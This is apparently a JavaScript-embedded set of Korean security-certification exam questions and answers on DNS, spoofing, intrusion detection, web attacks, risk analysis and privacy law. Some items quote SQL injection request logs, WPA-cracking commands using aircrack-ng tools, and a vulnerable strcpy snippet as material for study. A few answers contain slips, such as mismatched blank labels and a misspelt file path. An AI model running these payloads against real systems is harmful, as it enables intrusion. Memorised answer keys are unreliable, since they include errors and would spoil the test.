xml+='  <problem id="147">window에서 DNS cache를 확인 및 초기화하는 명령어는?&lt;br&gt;</problem>';
xml+='  <answer id="147">확인 : ipconfig /displaydns &lt;br&gt;초기화 : ipconfig /flushdns</answer>';
xml+='  <problem id="148">window DNS 질의 순서는?&lt;br&gt;</problem>';
xml+='  <answer id="148">1. 로컬 dns cache 검색&lt;br&gt;2. hosts.ics, hosts&lt;br&gt;3. 시스템에 설정된 dns 서버로 질의&lt;br&gt;</answer>';
xml+='  <problem id="149">관리하는/위임받은 도메인 없이 호스트의 질의가 들어오면 &lt;br&gt;자신의 캐시에 저장된 정보를 또는 반복적 질의를 통해 &lt;br&gt;그 결과를 사용자 호스트에 응답해주는 네임서버는?&lt;br&gt;</problem>';
xml+='  <answer id="149">recursive/cache/resolving name server&lt;br&gt;</answer>';
xml+='  <problem id="150">네임서버가(Authoritative) 관리하는 도메인 영역을 ( )이라 하고&lt;br&gt;관리 도메인에 대한 정보를 담고 있는 파일을 ( )이라 한다.&lt;br&gt;</problem>';
xml+='  <answer id="150">zone, zone file</answer>';
xml+='  <problem id="151">특정 도메인에 대한 정보를 관리하면서 &lt;br&gt;해당 도메인에 대한 질의에만 응답해주는 네임서버는?</problem>';
xml+='  <answer id="151">authoritative nameserver</answer>';
xml+='  <problem id="152">리눅스 파일 중 &lt;br&gt;네임 서버 설정 파일, DNS 질의 순서를 갖는 파일은?</problem>';
xml+='  <answer id="152">네임 서버 설정 파일 - /etc/resolve.conf&lt;br&gt;DNS 질의 순서 파일 - /etc/host.conf</answer>';
xml+='  <problem id="153">DNS Packet에 대해 설명하시오.&lt;br&gt;</problem>';
xml+='  <answer id="153">udp(53 port), tcp(53 port), 512byte 초과 or &lt;br&gt;zone Transfer의 경우 tcp를 이용한다.&lt;br&gt;</answer>';
xml+='  <problem id="154">DNS에서 해당 캐시 정보를 유지하는 시간(초 단위)를 &lt;br&gt;의미하는 것은?</problem>';
xml+='  <answer id="154">TTL(Time To Live)</answer>';
xml+='  <problem id="155">도메인의 등록정보, 네트워크 할당 정보 등을 조회하기 위한 &lt;br&gt;명령어는?&lt;br&gt;</problem>';
xml+='  <answer id="155">whois</answer>';
xml+='  <problem id="156">dns spoofing 공격 원리를 쓰시오. &lt;br&gt;</problem>';
xml+='  <answer id="156">dns 응답을 조작하거나 dns cache 정보를 조작하여 희생자가 &lt;br&gt;의도 하지 않은 주소로(pharming site) 접속하게 만드는 공격이다.&lt;br&gt;dns spoofing은 dns 질의/응답에 사용하는 udp 프로토콜의&lt;br&gt;"비연결 특성 취약점을 이용한 공격"이다. &lt;br&gt;&lt;br&gt;</answer>';
xml+='  <problem id="157">DNS Spoofing 대응책을 서술하시오.</problem>';
xml+='  <answer id="157">sniffing을 원천적으로 차단하거나 중요한 사이트라면&lt;br&gt;hosts에 등록하여 관리한다.&lt;br&gt;네임서버의 소프트웨어는 최신 버전 상태로 유지하고, &lt;br&gt;authoritative 네임서버는 recursive query를 허용하지 않는다.&lt;br&gt;</answer>';
xml+='  <problem id="158">DNS spoofing 공격 방식 두 가지를 서술하시오.</problem>';
xml+='  <answer id="158">dns spoofing은 sniffing을 이용한 dns spoofing이 있고, &lt;br&gt;dns cache poisoning이 있다. &lt;br&gt;sniffing을 이용한 공격은 희생자가 dns질의를 수행하면 &lt;br&gt;sniffing하던 공격자가 정상 dns nameserver보다 빠르게 &lt;br&gt;응답하여 dns spoofing을 하는 것이다. &lt;br&gt;&lt;br&gt;dns cache poisoning은 공격자가 recursive 서버에 조작할 &lt;br&gt;도메인 질의를 보낸다. &lt;br&gt;그리고 (sniffing이 불가능한 상황) source port와 &lt;br&gt;transaction id를 바꿔가며 다수의 조작된 dns 응답을 보낸다.&lt;br&gt;만약 이 응답 dns 패킷 중 정상 응답보다 빠르고 &lt;br&gt;그 값이 일치하면 recursive cache에는 조작된 캐시 정보가 &lt;br&gt;있을 것이고 많은 사용자가 해당 네임 서버에 조작된 도메인을&lt;br&gt;질의하면 공격자가 조작한 ip로 응답이 가게 된다.</answer>';
xml+='  <problem id="159">DNS에서 마스터에 있는 원본 존 데이터를 슬레이브가 동기화하는 &lt;br&gt;작업을 무엇이라 하는가?</problem>';
xml+='  <answer id="159">zone transfer</answer>';
xml+='  <problem id="160">네임서버로 질의를 수행하여 그 결과를 응용 프로그램에 &lt;br&gt;반환해주는 소프트웨어 모듈/라이브러리는?&lt;br&gt;</problem>';
xml+='  <answer id="160">resolver</answer>';
xml+='  <problem id="161">DNS zone 파일에서 쓰이는 리소스 레코드 형식은?&lt;br&gt;</problem>';
xml+='  <answer id="161">host_name TTL class record type data</answer>';
xml+='  <problem id="162">다음은 Diffie-Hellman 알고리즘을 통한 키 교환 과정이다. &lt;br&gt;(A), (B)에 대해서 각각 기술하시오.&lt;br&gt;&lt;br&gt;1. 앨리스가 소수 p, 그리고 1부터 p-1까지의 정수 g를 선택하여&lt;br&gt;사전에 밥과 공유한다.&lt;br&gt;2. 앨리스는 임의의 정수 a를 선택해 (A) 를 계산하고 밥도 &lt;br&gt;마찬가지로 임의의 정수 b를 선택하여 (B)를 계산한다.&lt;br&gt;3. 앨리스와 밥이 서로에게 A와 B를 전송한다.&lt;br&gt;4. 앨리스가 B^a mod p를, 밥이 A^b mod p를 계산한다.&lt;br&gt;5. 앨리스와 밥은 공통의 비밀키를 공유한다.</problem>';
xml+='  <answer id="162">(A) : g^a mod p, (B) : g^b mod p</answer>';
xml+='  <problem id="163">CVE-2014-0160로 명명된 이 취약점은 통신 구간 암호화를 위해 &lt;br&gt;사용하는 OpenSSL 암호화 라이브러리의 하트비트(Heartbeat)&lt;br&gt;라는 확장 모듈에서 클라이언트 요청 메시지를 처리할 때 &lt;br&gt;데이터 길이 검증을 수행하지 않아 시스템 메모리에 저장된 &lt;br&gt;64KB 크기의 데이터를 외부에서 아무런 제한 없이 &lt;br&gt;탈취할 수 있는 취약점이다.&lt;br&gt;&lt;br&gt;1) 어떤 프로토콜의 취약점인가?&lt;br&gt;2) 취약점 영향받는 버전은?</problem>';
xml+='  <answer id="163">1) SSL&lt;br&gt;&lt;br&gt;2) OpenSSL 1.01f 이전 버전</answer>';
xml+='  <problem id="164">다음 현상은 어떤 공격의 결과인가?&lt;br&gt;&lt;br&gt;Proto Recv-Q Send-Q Local Address Foreign Address State&lt;br&gt;tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN&lt;br&gt;tcp 0 0 192.168.0.10:80 211.xxx.xxx.xxx:2452 ESTABLISHED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2534 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2535 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2536 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2537 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:80 218.xxx.xx.xx:2531 ESTABLISHED&lt;br&gt;tcp 0 0 192.168.0.10:443 207.xx.xx.xx:1353 CLOSE_WAIT&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2538 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2539 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2530 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2525 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2562 SYN-RECEIVED</problem>';
xml+='  <answer id="164">SYN 플러딩</answer>';
xml+='  <problem id="165">다음의 접근통제 정책에 대해 빈칸 (A), (B), (C) &lt;br&gt;각각에 알맞은 용어를 기술하시오.&lt;br&gt;&lt;br&gt;( A ) : 객체의 소유자가 권한을 부여한다. &lt;br&gt;접근하는 사용자에게 권한을 추가. 삭제 할 수 있다.&lt;br&gt;&lt;br&gt;( B ) : 객체에 대한 접근은 주체의 보안등급에 기반하여 &lt;br&gt;접근을 제한한다.&lt;br&gt;&lt;br&gt;( C ) : 주체에게 할당된 역할에 기반하여 &lt;br&gt;객체에 접근을 제한한다.</problem>';
xml+='  <answer id="165">A: 임의적 접근통제 - DAC(Discretionary Access Control)&lt;br&gt;B: 강제적 접근통제 - MAC(Mandatory Access Control)&lt;br&gt;C: 역할기반 접근통제 - RBAC(Role Based Access Control)</answer>';
xml+='  <problem id="166">“/administrator” 라는 문자열이 포함되어 있는 경우 &lt;br&gt;“Web Scan Detected”란 메시지 로깅을 위한 &lt;br&gt;Snort rule은 각각 무엇인가?&lt;br&gt;&lt;br&gt;Alert tcp any any -&gt; 192.168.0.1 ( A ) ( ( B ) : “/administrator; &lt;br&gt;( C ): “Web Scan Detected”;)</problem>';
xml+='  <answer id="166">A: any&lt;br&gt;B: content&lt;br&gt;C: msg</answer>';
xml+='  <problem id="167">정보보호의 목적인 정보자산의 기밀성, 무결성, 가용성을 &lt;br&gt;실현하기 위한 절차와 과정을 체계적으로 수립, 문서화 하고&lt;br&gt;지속적으로 관리 운영하는 시스템은?</problem>';
xml+='  <answer id="167">정보보호관리체계, &lt;br&gt;ISMS( Information Security Management System)</answer>';
xml+='  <problem id="168">다음은 고유 취약점에 대한 표기 방법이다. 물음에 답하시오.&lt;br&gt;&lt;br&gt;CVE-2000-0234&lt;br&gt;&lt;br&gt;1) 2000의 의미는?&lt;br&gt;2) 0234의 의미는?</problem>';
xml+='  <answer id="168">1) 해당 취약점 리포팅 연도&lt;br&gt;2) 일련번호</answer>';
xml+='  <problem id="169">OWASP는 오픈소스 웹 애플리케이션 보안프로젝트 기구다.&lt;br&gt;주로 웹에 관한 정보노출, 악성 파일 및 스크립트, &lt;br&gt;보안 취약점등을 연구하며 3년 마다 10대 웹 애플리케이션의 &lt;br&gt;취약점을 발표한다. 다음에서 언급하고 있는 내용은 &lt;br&gt;어떤 취약점을 설명하고 있는 것인가?&lt;br&gt;&lt;br&gt;1) 신뢰할 수 없는 데이터가 명령어나 질의문의 일부분으로서 &lt;br&gt;인터프리터로 보내질 때 발생한다. 공격자의 악의적인 데이터는 &lt;br&gt;예상하지 못하는 명령을 실행하거나 적절한 권한 없이 데이터에 &lt;br&gt;접근하도록 인터프리터를 속일 수 있다.&lt;br&gt;&lt;br&gt;2) 신뢰할 수 없는 데이터를 가져와 적절한 검증이나 제한 없이 &lt;br&gt;웹 브라우저로 보낼 때 발생한다. &lt;br&gt;공격자가 피해자의 브라우저에 스크립트를 실행하여 &lt;br&gt;사용자 세션 탈취, 웹 사이트 변조, 악의적인 사이트로 &lt;br&gt;이동할 수 있다.&lt;br&gt;&lt;br&gt;3) 로그온 된 피해자의 취약한 웹 애플리케이션에 &lt;br&gt;피해자의 세션 쿠키와 기타 다른 인증정보를 자동으로 &lt;br&gt;포함하여 위조된 HTTP 요청을 강제로 보내도록 하는 것이다. &lt;br&gt;이것은 공격자가 취약한 애플리케이션이 피해자로부터의 &lt;br&gt;정당한 요청이라고 오해할 수 있는 요청들을 강제로 만들 수 있다.</problem>';
xml+='  <answer id="169">1) Injection, 2) XSS, 3) CSRF</answer>';
xml+='  <problem id="170">개인정보보호법 제17조에 따르면 개인정보 제3자 제공 시 동의를&lt;br&gt;받을 때 5가지 사항을 정보주체에게 알려야 한다. &lt;br&gt;다음 5가지 어느 하나의 사항을 변경하는 경우에도 &lt;br&gt;이를 알리고 동의를 받아야 한다. 5가지 사항을 적으시오.</problem>';
xml+='  <answer id="170">1. 개인정보를 제공받는 자&lt;br&gt;2. 개인정보를 제공받는 자의 개인정보 이용 목적&lt;br&gt;3. 제공하는 개인정보의 항목&lt;br&gt;4. 개인정보를 제공받는 자의 개인정보 보유 및 이용 기간&lt;br&gt;5. 동의를 거부할 권리가 있다는 사실 및 동의 거부에 &lt;br&gt;따른 불이익이 있는 경우에는 그 불이익의 내용</answer>';
xml+='  <problem id="171">다음 위험분석 및 위험평가 관련 내용 중 빈칸 (A), (B), (C), (D) &lt;br&gt;각각에 알맞은 용어를 기재하시오.&lt;br&gt;&lt;br&gt;( A ) : 국내외 표준, 기존에 마련되어 있는 법령, 가이드 등으로 &lt;br&gt;기준을 정하여 위험을 관리&lt;br&gt;&lt;br&gt;( B ) : 구조적인 방법론에 기반하지 않고 경험자의 지식을 &lt;br&gt;사용하여 위험분석을 수행하는 것이다.&lt;br&gt;&lt;br&gt;( C ) : 정립된 모델에 기초하여 자산분석, 위협분석, 취약성분석 &lt;br&gt;각 단계를 수행하여 위험을 평가하는 것이다.&lt;br&gt;&lt;br&gt;( D ) : 위 세 가지 방법을 혼합하여 접근하는 방식을 말한다.</problem>';
xml+='  <answer id="171">(A): 베이스라인 접근법&lt;br&gt;(B): 비정형 접근법&lt;br&gt;(C): 상세위험분석&lt;br&gt;(D): 복합접근법</answer>';
xml+='  <problem id="172">다음 빈칸에 알맞은 단어를 적으시오.&lt;br&gt;&lt;br&gt;( A ) : 조직의 자산에 대한 위험을 수용할 수 있는 수준으로 &lt;br&gt;유지하기 위하여 자산에 대한 위험을 분석하고 &lt;br&gt;이러한 위험으로부터 자산을 보호하기 위해 비용대비 효과적인 &lt;br&gt;보호대책을 마련하는 일련의 과정&lt;br&gt;&lt;br&gt;( B ) : 조직은 정보자산의 식별 후에 식별된 정보자산에 영향을 줄 수 있는 모든 위협과 취약성, 위험을 식별하고 분류하여야 하며, 이 정보자산의 가치와 위험을 고려하여 잠재적 손실에 대한 영향을&lt;br&gt;식별 분석해야 한다.&lt;br&gt;&lt;br&gt;( C ) : 위헙에 대응하여 자산을 보호하기 위한 물리적, 기술적, &lt;br&gt;관리적 대응책을 말한다.</problem>';
xml+='  <answer id="172">( A ) : 위험관리&lt;br&gt;&lt;br&gt;( B ) : 위험분석&lt;br&gt;&lt;br&gt;( C ) : 위험대응</answer>';
xml+='  <problem id="173">다음에서 설명하고 있는 것은 무엇인가?&lt;br&gt;&lt;br&gt;웹 서버를 대신하여 자신이 마치 웹 서버인 것처럼 동작을 대행해준다. 브라우저로부터 연결 요청에 대하여 대신 응답한다. 대표적인 툴로는 ‘paros’ 와 ‘burp suite’등이 있다.</problem>';
xml+='  <answer id="173">Web Proxy</answer>';
xml+='  <problem id="174">다음은 침입 탐지 시스템에 관한 용어 설명이다.&lt;br&gt;(A), (B)에 알맞은 용어를 작성하시오.&lt;br&gt;&lt;br&gt;( B ) 는 공격인데 공격이 아닌 것으로 잘못 판단하는 것을 말하고,&lt;br&gt;( C )는 공격이 아닌데 공격으로 잘 못 판단하는 것을 말한다.</problem>';
xml+='  <answer id="174">(A) False Negative&lt;br&gt;(B) False Positive</answer>';
xml+='  <problem id="175">다음 5개의 스캔 방법 중 포트가 닫혀있을 때만 &lt;br&gt;응답이 오는 스캔 방식만을 고르시오.&lt;br&gt;[ SYN Scan, FIN Scan, XMAS Scan, NULL Scan ]</problem>';
xml+='  <answer id="175">FIN, XMAS, NULL</answer>';
xml+='  <problem id="176">다음은 Telnet으로 웹 서버를 호출하는 방법이다. &lt;br&gt;대상 호스트가 192.168.5.2일 때 아래와 같은 결과가 나오려면 &lt;br&gt;어떤 명령을 입력하여야 하는가?&lt;br&gt;&lt;br&gt;HTTP/1.1 200 OK&lt;br&gt;Server: Microsoft-IIS/5.0&lt;br&gt;Date: Tue, 31 Oct 2006 08:00:29 GMT&lt;br&gt;Connection: close&lt;br&gt;Allow: GET, HEAD, POST, TRACE, OPTIONS&lt;br&gt;Content-Length: 0</problem>';
xml+='  <answer id="176">$ telnet 192.168.5.2 80&lt;br&gt;OPTIONS / HTTP/1.1&lt;br&gt;Host: 192.168.5.2</answer>';
xml+='  <problem id="177">다음은 BOF(버퍼오버플로우)공격이 가능한 소스 중 일부분이다. &lt;br&gt;BOF를 방지하기 위한 소스로 수정하시오.&lt;br&gt;&lt;br&gt;int main(int argc, char *argv[]){&lt;br&gt;&lt;br&gt;  char buff[8];&lt;br&gt;  strcpy(buff, argv[1]);&lt;br&gt;  return 0;&lt;br&gt;&lt;br&gt;}</problem>';
xml+='  <answer id="177">strncpy( buff, argv[1], 7 ); &lt;br&gt;또는&lt;br&gt;strncpy( buff, argv[1], sizeof(buff)-1 );</answer>';
xml+='  <problem id="178">VPN(Virtual Private Network) 3계층에서 동작하는 프로토콜의 &lt;br&gt;2가지 기밀성 동작 모드를 적고, &lt;br&gt;암호화하는 구간에 대해 설명하시오.&lt;br&gt;</problem>';
xml+='  <answer id="178">전송모드 : End-To-End&lt;br&gt;터널모드 : G/W-To-G/W(라우터)&lt;br&gt;</answer>';
xml+='  <problem id="179">다음 로그에서 나타나는 공격을 보고 물음에 답하시오.&lt;br&gt;&lt;br&gt;"GET /login?id=1\'+and+substr(password,2,1)=\'0\'# HTTP/1.1" 200 1739 "" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"&lt;br&gt;&lt;br&gt;"GET /login?id=1\'+and+substr(password,2,1)=\'1\'# HTTP/1.1" 200 1788 "" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"&lt;br&gt;&lt;br&gt;"GET /login?id=1\'+and+substr(password,1,1)=\'2\'# HTTP/1.1" 200 1789 "" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"&lt;br&gt;&lt;br&gt;"GET /login?id=1\'+and+substr(password,1,1)=\'3\'# HTTP/1.1" 200 1789 "" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"&lt;br&gt;&lt;br&gt;1) 어떤 공격 기법이 사용되었는가?&lt;br&gt;2) 해당 공격 원리에 대해 설명하시오.&lt;br&gt;3) 공격의 결과에 대해 설명하시오.</problem>';
xml+='  <answer id="179">1) blind sql injection&lt;br&gt;&lt;br&gt;2) 단순히 SQL문을 조작하여 인증을 우회하거나 특정 명령을 &lt;br&gt;수행하는 것 외에 DB에 저장된 값을 추정 가능. &lt;br&gt;분할과 정복의 원리를 이용하여 문자열 중 단일 문자와의 &lt;br&gt;비교를 통해 결과가 True or False 인지 확인.&lt;br&gt;&lt;br&gt;3) id가 1인 사용자의 password 컬럼값에 대해 substr( )함수를 &lt;br&gt;이용하여 1부터 순차적으로 한문자 씩 비교를 수행한다.</answer>';
xml+='  <problem id="180">개인정보보호법에 따른 개인정보 안전성확보조치에서 &lt;br&gt;접속기록 관리 방법에 대해 서술하시오.</problem>';
xml+='  <answer id="180">1) "접속기록"이란 개인정보취급자 등이 개인정보처리시스템에 &lt;br&gt;접속하여 수행한 업무내역에 대하여 개인정보취급자 등의 계정, &lt;br&gt;접속일시, 접속지 정보, 처리한 정보주체 정보, &lt;br&gt;수행업무 등을 전자적으로 기록한 것을 말한다.&lt;br&gt;&lt;br&gt;2) 개인정보처리자는 개인정보취급자가 개인정보처리시스템에 접속한 기록을 1년 이상 보관·관리하여야 한다. 다만, 5만명 이상의 정보주체에 관하여 개인정보를 처리하거나, 고유식별정보 또는 민감정보를 처리하는 개인정보처리시스템의 경우에는 2년 이상 보관·관리하여야 한다.&lt;br&gt;&lt;br&gt;3) 개인정보처리자는 개인정보의 오·남용, 분실·도난·유출·위조·변조 또는 훼손 등에 대응하기 위하여 개인정보처리시스템의 접속기록 등을 월 1회 이상 점검하여야 한다.</answer>';
xml+='  <problem id="181">다음 보기를 보고 문제점과 해결방안을 제시하시오.&lt;br&gt;&lt;br&gt;tcp any any -&gt; any any PCRE(/^POST.*Content\\x2dLength\\x2a\\x20evilstring)&lt;br&gt;&lt;br&gt;1) 해당 Rule은 어떤 문제점을 가지고 있는가?&lt;br&gt;2) 해결방안은 무엇인가?&lt;br&gt;&lt;br&gt;</problem>';
xml+='  <answer id="181">1) Rule에는 HTTP 프로토콜에 대한 정규식(POST, Content-Length가 포함)이지만 모든 포트 any로 설정되어 있어 &lt;br&gt;HTTP서비스가 아닌 불필요한 트랙픽에 대해서도 감시를 수행함. 시스템에 오버헤드 유발.&lt;br&gt;&lt;br&gt;2) 목적지 주소와 포트를 웹서버주소, 80 포트로 설정하여 &lt;br&gt;부하를 감소&lt;br&gt;tcp any any -&gt; 웹서버IP 80</answer>';
xml+='  <problem id="182">다음 WPA를 크래킹(Cracking) 하는 과정을 참조하여 &lt;br&gt;질문에 답하시오.&lt;br&gt;&lt;br&gt;airodump-ng ?c 0 ?bssid E8:00:43:47:A1:AB:CD ?w wpa mon0&lt;br&gt;&lt;br&gt;aireplay-ng -0 ?a E8:00:43:47:A1:AB:CD ?c 00:CD:53:A1:80:CA:E0 mon0&lt;br&gt;&lt;br&gt;aircrack-ng ?w pw.lst ?b ( A ) *.cap&lt;br&gt;&lt;br&gt;1) 첫 문장에서 bssid는 무엇을 의미하는가?&lt;br&gt;&lt;br&gt;2) 두번째 문장 -c 는 무엇을 의미하는가?&lt;br&gt;&lt;br&gt;3) 네번째 문장 pw, lst는 무엇을 의미하는가?&lt;br&gt;&lt;br&gt;4) ( A )에 해당하는 명령어는 무엇인가?</problem>';
xml+='  <answer id="182">1) 공격대상 AP의 MAC 주소&lt;br&gt;2) 클라이언트 MAC 주소&lt;br&gt;3) 미리 정의된 Dictionary공격을 위한 패스워드 리스트가 &lt;br&gt;기록된 Dictionary 파일&lt;br&gt;4) 공격대상 AP의 MAC 주소 E8:00:43:47:A1:AB:CD</answer>';
xml+='  <problem id="183">어떤 회사에서 5년에 한번씩 화재가 발생하여, 전체 회사 자산인 40억의 30%에 해당하는 손해가 발생한다고 한다. 따라서, 몇 천만원을 들여서 소방 방재 시설을 설치하고, 1억원을 들여 화재가 날 경우 10억까지 보상해주는 보험에 가입하였다.&lt;br&gt;&lt;br&gt;1) 자산 가치는 얼마인가?&lt;br&gt;2) 노출계수는 얼마인가?&lt;br&gt;3) 단일손실예상액은 얼마인가?&lt;br&gt;4) 연간 발생률은 얼마인가?&lt;br&gt;5) 연간 예상손실액은 얼마인가?&lt;br&gt;6) 회사가 세운 대책은 어떤 것들이 있는가?&lt;br&gt;</problem>';
xml+='  <answer id="183">1) 40억&lt;br&gt;2) 30%&lt;br&gt;3) Asset * EP = 40 x 0.3 = 12억 (SLE)&lt;br&gt;4) 0.2 (5년에 1회 화재발생)&lt;br&gt;5) 12억 x 0.2 = 2.4억 ( ALE )&lt;br&gt;6)&lt;br&gt;- 위험 완화 : 화재로 발행하는 위험을 완화시키기 위해, &lt;br&gt;소방 방재 시설을 설치하였다.&lt;br&gt;&lt;br&gt;- 위험 전가 : 화재로 발생하는 위험에 대한 부담을 전가하기 위해&lt;br&gt; 화재 보험을 가입하였다.</answer>';
xml+='  <problem id="184">다음에서 설명하고 있는 파일시스템의 기능은 무엇인가?&lt;br&gt;&lt;br&gt;ext3 파일 시스템부터 새롭게 적용된 기능이다. ext2에서는 시스템 크래쉬가 발생 할 경우 파일 시스템 검사 프로그램인 fsck가 실행되어 파일 시스템을 검사하는 과정을 통해 파일 복구에 많은 시간이 소요됐으나 이 파일시스템은 데이터를 바로 하드디스크에 기록하기 전에 관련 데이터를 로그에 기록하여 비정상적인 종료를 하게 되면 다시 부팅할 때 기록된 데이터를 기반으로 빠르게 복구가 가능하다.</problem>';
xml+='  <answer id="184">저널링(Journaling)</answer>';
xml+='  <problem id="185">다음 보기에서 설명하고 있는 것은 무엇인가?&lt;br&gt;&lt;br&gt;동일한 취약점에 대해 해커와 보안업체간 다르게 사용해온 명칭을 표준화한 목록이며, 미국의 비영리기관인 MITRE의 테스트를 거쳐 호환성이 충족된 보안제품과 서비스에 한해 등록이 가능하다.</problem>';
xml+='  <answer id="185">CVE(Common Vulverabilities and Exposures)</answer>';
xml+='  <problem id="186">웹 서버에 다음과 같은 로그를 발견하였다. &lt;br&gt;어떤 공격으로 판단 할 수 있는가?&lt;br&gt;&lt;br&gt;"GET /login.php?id%3D%27user%27%20and%20pw%3D%271%27%20or%201%3D1 HTTP/1.1" 200 3926</problem>';
xml+='  <answer id="186">SQL 인젝션(Injection)&lt;br&gt;</answer>';
xml+='  <problem id="187">FTP 서비스를 운영하는 서버에 공격 징후가 발견 되었다. &lt;br&gt;시스템 관리자는 해당 FTP서버에서 다음과 같은 현상이 확인하였다. 어떤 유형의 공격인가?&lt;br&gt;&lt;br&gt;# netstat -na&lt;br&gt;&lt;br&gt;Active Internet connections (servers and established)&lt;br&gt;Proto Recv-Q Send-Q Local Address Foreign Address State&lt;br&gt;tcp 0 0 0.0.0.0:21 0.0.0.0:* LISTEN&lt;br&gt;tcp 0 0 192.168.0.10:80 211.xxx.xxx.xxx:2452 ESTABLISHED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2534 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2535 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2536 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2537 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:80 218.xxx.xx.xx:2531 ESTABLISHED&lt;br&gt;tcp 0 0 192.168.0.10:443 207.xx.xx.xx:1353 CLOSE_WAIT&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2538 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2539 SYN-RECEIVED&lt;br&gt;tcp 0 0 192.168.0.10:21 211.xxx.xx.x:2530 SYN-RECEIVED</problem>';
xml+='  <answer id="187">SYN 플러딩(Flooding)</answer>';
xml+='  <problem id="188">다음 빈칸에 알맞은 단어를 적으시오.&lt;br&gt;&lt;br&gt;개인정보처리자는 개인정보취급자가 개인정보처리시스템에 &lt;br&gt;접속한 기록을 ( A ) 이상 보관·관리하여야 한다. 다만, ( B ) 이상의 정보주체에 관하여 개인정보를 처리하거나, 고유식별정보 또는 민감정보를 처리하는 개인정보처리시스템의 경우에는 ( C ) 이상 보관·관리하여야 한다.&lt;br&gt;&lt;br&gt;개인정보처리자는 개인정보의 오·남용, 분실·도난·유출·위조·변조 또는 훼손 등에 대응하기 위하여 개인정보처리시스템의 접속기록 등을 ( D )이상 점검하여야 한다. &lt;br&gt;&lt;br&gt;※ D는 주기임</problem>';
xml+='  <answer id="188">A: 1년&lt;br&gt;B: 5만명&lt;br&gt;C: 2년&lt;br&gt;D: 월 1회</answer>';
xml+='  <problem id="189">다음에서 설명하고 있는 (A), (B)에 알맞은 용어를 작성하시오&lt;br&gt;&lt;br&gt;실행가능한 스크립트 파일을 첨부하여 원격에서 제어하는 공격을 &lt;br&gt;( A )이라고 하며, 첨부되는 스크립트 파일을 ( B )이라고 한다.</problem>';
xml+='  <answer id="189">A: 파일 업로드 공격&lt;br&gt;B: 웹셸</answer>';
xml+='  <problem id="190">system(), exec() 같은 운영체제의 명령어를 실행 할 수 있는 함수가 실행되는 페이지를 include 한 경우 명령어 삽입을 통한 공격이 가능하다. PHP의 경우 외부 사이트의 악성 파일이 include 되지 않도록 하기 위해 PHP상에서 외부의 파일을 열수 있는지 설정하는 옵션을 꺼 두어야 한다.&lt;br&gt;&lt;br&gt;1) PHP의 설정 파일 명은?&lt;br&gt;2) 외부 파일을 열수 있는지 설정할 수 있는 옵션 명은?</problem>';
xml+='  <answer id="190">1) php.ini&lt;br&gt;2) allow_url_fopen</answer>';
xml+='  <problem id="191">위험관리 기법 중에서 위험을 인지하였으나 별도의 통제를 &lt;br&gt;수행하지 않고 위험을 받아들이고 진행하는 위험관리 기법을 &lt;br&gt;( )이라 한다.</problem>';
xml+='  <answer id="191">위험 수용</answer>';
xml+='  <problem id="192">(A), (B), (C)에 알맞은 용어를 작성하시오.&lt;br&gt;&lt;br&gt;정보자산에 대한 잠재적 및 알려진 ( A )과 ( B )으로 나타날 수 있는 조직의 피해와 현재 구현된 통제의 실패 가능성 및 영향을 평가 시 ( C ) (DOA)을 포함하여야 한다. 이를 통해 정보자산의 위험을 관리할 수 있는 적절한 정보보호대책 선택 및 우선순위의 확보를 지원하여야 한다.</problem>';
xml+='  <answer id="192">A: 취약점&lt;br&gt;B: 위협&lt;br&gt;C: 수용 가능 위험수준(Degree of Assurance)</answer>';
xml+='  <problem id="193">다음에서 설명하는 보안 절차는 무엇인가?&lt;br&gt;&lt;br&gt;각종 재난·재해로부터 정보시스템 중단을 가정하여 시간흐름에 &lt;br&gt;따른 영향도 조사하여 복구우선순위를 정의하고, 업무를 재개하기 위한 최소 필요자원을 도출하는 업무 연속성 계획의 핵심 절차</problem>';
xml+='  <answer id="193">업무 영향 분석</answer>';
xml+='  <problem id="194">정보통신기반보호법 제16조에 따라 금융?통신 등 분야별 정보통신기반시설을 보호하기 위하여 정보공유?분석센터를 구축?운영할 수 있다. 정보공유 분석센터 하는 역할을 두 가지 서술하시오.</problem>';
xml+='  <answer id="194">1) 취약점 및 침해요인과 그 대응방안에 관한 정보 제공&lt;br&gt;2) 침해사고가 발생하는 경우 실시간 경보?분석체계 운영</answer>';
